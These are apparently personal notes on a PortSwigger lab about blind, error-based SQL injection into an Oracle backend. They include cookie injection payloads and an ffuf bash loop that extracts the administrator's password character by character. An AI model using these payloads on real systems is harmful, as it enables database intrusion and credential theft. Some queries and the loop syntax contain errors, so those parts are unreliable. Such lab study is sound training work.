https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

### Confirm SQLI
Let's confirm the existence of this

As a simple bolean like `' AND '2'='1` doesn't change anything from the response we need to use a conditional instead, just like `' CASE WHEN ('2'='1') THEN 1/0 ELSE 'a' end ='a`
![[Pasted image 20241108165937.png]]

### Determine RDBMS
But wuickly we notice that every query is throwing an error, because we are constructing invalid queries for it version. To determine the RDBMS we could try database-specific functions:
###### confirm RDBMS:

Use the cheat sheet https://portswigger.net/web-security/sql-injection/cheat-sheet
If this injection isn't triggering an error
```sql
''foo'||'bar''
```
it's because it's and oracle RDBMS
### Generating conditional
From the cheat sheet we know that the concatenation in Oracle is like `'foo'||'bar'` and the sql subprocess goes between prenthesis. 
So we should go
```sql
xyz'||(SELECT NULL FROM DUAL)||'
```
From dual it's single-column table created by default in all Oracle databases, and we're selecting null from it, so we are in the right track, now let's get this harder.
We use `TO_CHAR()` for the number, so 
```cookie
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```
But instead of using `'a'`, oracle used `''`  to return "nothing" or simply a placeholder becomes
```cookie
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL )||'
```
And the backend use it like this
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' FROM DUAL END) || '' || (SELECT 'a' FROM users LIMIT 1)='a'
```

### Enumerating

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId=''||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||''
```
```cookie
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

SUBSTRING('foobar', 4, 2)
```cookie
'SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual'
```
is similar to the syntax we saw in [[summary_SQLI]] but 

```sh
or (( i=1; i<=20; i++ )); do
ffuf -u "https://0abd00bf031c89fa81b0e5c800dd001d.web-security-academy.net/" -w alpha-numeric.txt -v  -H "Cookie: TrackingId=DfwkYx14uMMtfOrb'||(SELECT CASE WHEN SUBSTR(password,$i,1)='FUZZ' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=WMSBepybGJgrFBe0LVU4Jka3fb1ovJMX" -ac -t 100 -s >>./password.txt
done                                                      
cat password.txt | tr -d "\n" | xclip -selection clipboard
```